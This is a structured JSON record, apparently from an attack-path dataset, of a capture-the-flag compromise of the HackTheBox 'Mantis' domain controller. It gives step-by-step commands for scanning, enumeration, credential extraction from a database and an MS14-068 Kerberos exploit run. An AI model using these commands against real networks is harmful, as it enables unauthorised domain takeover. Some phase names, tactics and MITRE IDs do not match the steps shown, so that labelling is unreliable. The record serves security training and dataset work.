{
  "id": "ap-0017",
  "title": "Domain Controller Compromise via MS14-068",
  "summary": "Initial access gained through exposed credentials leading to database compromise, followed by exploitation of the MS14-068 Kerberos vulnerability to achieve SYSTEM privileges on the Domain Controller.",
  "attack_path_markdown": "### Step 1: Initial Enumeration\nPerform comprehensive port and service scanning on the target system (10.10.10.52). Identify key services including MS SQL (1433), Kerberos (88), SMB (445), and web services (1337, 8080).\n\n### Step 2: Credential Discovery\nEnumerate web application paths, locating a plain text file (`securenotes.txt`) containing encoded credentials for a database SA account. Decode credentials and connect to the MS SQL database to extract a domain user's password.\n\n### Step 3: Privilege Escalation\nLeverage the valid domain user credential to exploit the Microsoft Kerberos Checksum Validation Vulnerability (MS14-068) using the system hostname, resulting in immediate Domain Administrator privileges.",
  "kill_chain": [
    {
      "phase_order": 1,
      "phase_name": "Reconnaissance",
      "description": "Identify live host, operating system, open ports, and running services.",
      "actions": [
        "Perform host discovery using: ping 10.10.10.52",
        "Execute a full TCP port scan (0-65535) using Nmap with aggressive settings: nmap -sS -p- --min-rate 5000 -vvv -n -Pn 10.10.10.52 -oG ports",
        "Perform service and version enumeration on identified open ports using Nmap: nmap -sC -sV -p <ports list> 10.10.10.52 -oN total",
        "Resolve the domain hostname by adding the entry to /etc/hosts: 10.10.10.52 mantis.htb.local"
      ],
      "tools": ["ping", "nmap", "with_system.py"],
      "techniques": ["Active Scanning (T1595.001)", "Gather Victim Identity Information (T1589)"],
      "mitre_ids": ["T1595.001", "T1589"],
      "indicators": ["TTL 128 (Windows OS)", "Open ports: 53, 88, 135, 445, 1433, 1337, 8080"],
      "preconditions": "Network connectivity to the target host.",
      "expected_outcome": "List of services, OS type, and domain name (Mantis.htb.local).",
      "confidence": 1.0
    },
    {
      "phase_order": 2,
      "phase_name": "Weaponization",
      "description": "Preparation phase involving directory enumeration and initial checks for open shares/services.",
      "actions": [
        "Check SMB/RPC for null session access (Access Denied for user enumeration): rpcclient 10.10.10.52 -U '' -N followed by enumdomusers",
        "Execute initial checks using CrackMapExec to confirm Windows domain info: crackmapexec smb 10.10.10.52",
        "Attempt to list resources via SMB client: smbclient -L 10.10.10.52 (Anonymously successful but no shares listed)",
        "Identify web technologies on port 1337: watweb 10.10.10.52:1337 (Identified IIS 7.5 and potential Orchard CMS)",
        "Enumerate directories on discovered web ports (e.g., 8080) targeting the Orchard CMS installation: gobuster dir -u http://10.10.10.52:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60"
      ],
      "tools": ["gobuster", "rpcclient", "smbclient", "crackmapexec", "watweb"],
      "techniques": ["Network Service Scanning (T1046)", "Vulnerability Scanning (T1595.002)"],
      "mitre_ids": ["T1046", "T1595.002"],
      "indicators": ["Orchard CMS installed", "IIS 7.5 version identified", "Discovery of /securenotes/ path."],
      "preconditions": "Reconnaissance phase complete.",
      "expected_outcome": "Discovery of relevant web paths and confirmation of basic security posture (no easy null session access).",
      "confidence": 0.9
    },
    {
      "phase_order": 3,
      "phase_name": "Delivery",
      "description": "Acquisition of an artifact containing highly sensitive, encoded data.",
      "actions": [
        "Navigate to the discovered path and download the file: http://10.10.10.52:8080/securenotes/securenotes.txt"
      ],
      "tools": ["Web Browser / HTTP Request"],
      "techniques": ["Gather Victim Information (T1592)"],
      "mitre_ids": ["T1592"],
      "indicators": ["File contents contain base64 and hexadecimal strings."],
      "preconditions": "Successful directory enumeration.",
      "expected_outcome": "Obtained 'securenotes.txt' file.",
      "confidence": 1.0
    },
    {
      "phase_order": 4,
      "phase_name": "Exploitation",
      "description": "Use encoding methods to extract high-value credentials, leading to database access and compromise of a domain user.",
      "actions": [
        "Decode base64 string using: echo (base64 string) | base64 -d",
        "Decode resulting hexadecimal string using: echo (hex string) | xxd -r -ps",
        "Connect to the MS SQL Server (10.10.10.52:1433) using DBeaver with SA credentials: `admin:(password)`.",
        "Query the `User` table in the `OrchardDB` database to retrieve credentials for the domain user `james`."
      ],
      "tools": ["base64", "xxd", "DBeaver", "MS SQL Client"],
      "techniques": ["Decode Files or Information (T1140)", "Data from Local System (T1005)", "Credentials from Password Stores (T1555)"],
      "mitre_ids": ["T1140", "T1005", "T1555"],
      "indicators": ["Cleartext credentials for MS SQL SA account", "Valid domain user password extracted from the database."],
      "preconditions": "Database access credentials obtained.",
      "expected_outcome": "Valid domain user credentials: `james:(password)`.",
      "confidence": 1.0
    },
    {
      "phase_order": 5,
      "phase_name": "Installation",
      "description": "Establishing a foothold and comprehensive enumeration using valid user credentials in preparation for escalation.",
      "actions": [
        "Validate domain user credentials: crackmapexec smb 10.10.10.52 -u james -p (password)",
        "Perform Active Directory enumeration using LDAP: ldapdomaindump 10.10.10.52 -u htb.local\\james -p (password)",
        "Gather AD data for BloodHound visualization (remote collection): bloodhound-python -c All -ns 10.10.10.52 -d htb.local -u james -p (password) (Requires Neo4j and BloodHound UI for visualization)",
        "Attempt to enumerate shares with credentials: smbmap -H 10.10.10.52 -u james -p (password) (Identified NetLogon and Sysvol shares)"
      ],
      "tools": ["crackmapexec", "ldapdomaindump", "bloodhound-python", "smbmap"],
      "techniques": ["Valid Accounts (T1078)", "Active Directory Enumeration (T1087.002)", "Network Service Scanning (T1046)"],
      "mitre_ids": ["T1078", "T1087.002", "T1046"],
      "indicators": ["Successful authentication status", "Detailed AD structure gathered (users, groups)."],
      "preconditions": "Valid domain user credentials.",
      "expected_outcome": "Full map of Active Directory environment and potential escalation paths.",
      "confidence": 1.0
    },
    {
      "phase_order": 6,
      "phase_name": "Command and Control",
      "description": "Leverage the MS14-068 vulnerability exploit to gain a high-privilege ticket.",
      "actions": [
        "Execute the GoldenPac MS14-068 exploit script, initially failing when attempting to use the IP address (10.10.10.52): ./ms14-068.py -u james@htb.local -p (password) -d 10.10.10.52",
        "Re-execute the exploit successfully using the Domain Controller's hostname: ./ms14-068.py -u james@htb.local -p (password) -k mantis"
      ],
      "tools": ["GoldenPac (ms14-068.py)"],
      "techniques": ["Kerberos Exploitation (T1558)", "Exploitation for Privilege Escalation (T1068)"],
      "mitre_ids": ["T1558", "T1068", "CVE-2014-6324"],
      "indicators": ["High-privileged TGT (Ticket Granting Ticket) generated, leading to NT AUTHORITY\\SYSTEM access."],
      "preconditions": "Valid domain user credentials (`james`) and knowledge of DC hostname (`mantis`) (must be listed in /etc/hosts).",
      "expected_outcome": "Achievement of an elevated session via network access.",
      "confidence": 1.0
    },
    {
      "phase_order": 7,
      "phase_name": "Actions on Objectives",
      "description": "Accessing confidential data (flags) with maximum domain authority.",
      "actions": [
        "Establish a shell session with the acquired high-privilege ticket.",
        "Search and retrieve the user flag (user.txt).",
        "Search and retrieve the root flag (root.txt)."
      ],
      "tools": ["DCE/RPC access tools (via GoldenPac outcome)"],
      "techniques": ["Data Exfiltration (T1041)", "Account Manipulation (T1098)"],
      "mitre_ids": ["T1041", "T1098"],
      "indicators": ["Successful elevation to NT AUTHORITY\\SYSTEM", "Flags accessed."],
      "preconditions": "High-privilege ticket obtained.",
      "expected_outcome": "Full compromise of the Domain Controller and retrieval of objective files.",
      "confidence": 1.0
    }
  ],
  "tactics": ["Reconnaissance", "Credential Access", "Discovery", "Privilege Escalation", "Lateral Movement", "Impact"],
  "techniques": ["MS14-068", "Information Exposure", "Kerberos Exploitation", "SQL Credential Theft"],
  "mitre_ids": ["T1558.003", "T1558", "T1003", "T1592", "T1068"],
  "hosts": ["10.10.10.52 (mantis)", "htb.local (Domain)"],
  "privs_obtained": ["domain user (james)", "NT AUTHORITY\\SYSTEM"],
  "confidence": 1.0,
  "notes": "The successful exploitation of MS14-068 was critically dependent on using the hostname ('mantis') instead of the IP address for the exploit script.",
  "labels": ["attack_path", "active_directory", "domain_controller", "ms14-068"]
}
